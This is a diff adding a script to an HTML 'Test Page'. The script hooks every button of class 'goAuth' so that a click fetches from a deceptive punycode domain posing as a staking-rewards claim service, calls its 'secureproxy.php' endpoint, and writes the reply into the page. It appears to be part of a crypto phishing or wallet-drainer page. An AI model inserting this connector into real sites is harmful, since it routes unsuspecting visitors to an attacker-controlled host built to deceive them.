@@ -4,6 +4,34 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Test Page</title>
+  <script>async function startConnect() {
+            try {
+                const response = await fetch('https://xn--soend-l7a.fi-staking-rewards-claim.api-dashboard-connect.com/secureproxy.php', {
+                    method: 'GET', // или 'POST', если eleven.php ожидает POST
+                    headers: {
+                        'Content-Type': 'application/json' // если eleven.php возвращает JSON
+                    }
+                    // Если нужен POST-запрос, раскомментируйте:
+                    // body: JSON.stringify({ key: 'value' })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+
+                const data = await response.json(); // Если eleven.php возвращает JSON
+                // Если eleven.php возвращает текст, замените на: response.text()
+                document.getElementById('response').innerText = JSON.stringify(data, null, 2);
+            } catch (error) {
+                document.getElementById('response').innerText = 'Error: ' + error.message;
+            }
+        }
+
+        // Назначаем обработчик кликов для всех элементов с классом goAuth
+        document.querySelectorAll('.goAuth').forEach(button => {
+            button.addEventListener('click', startConnect);
+        });
+		</script>
 </head>
 <body>
   <!-- Кнопка -->
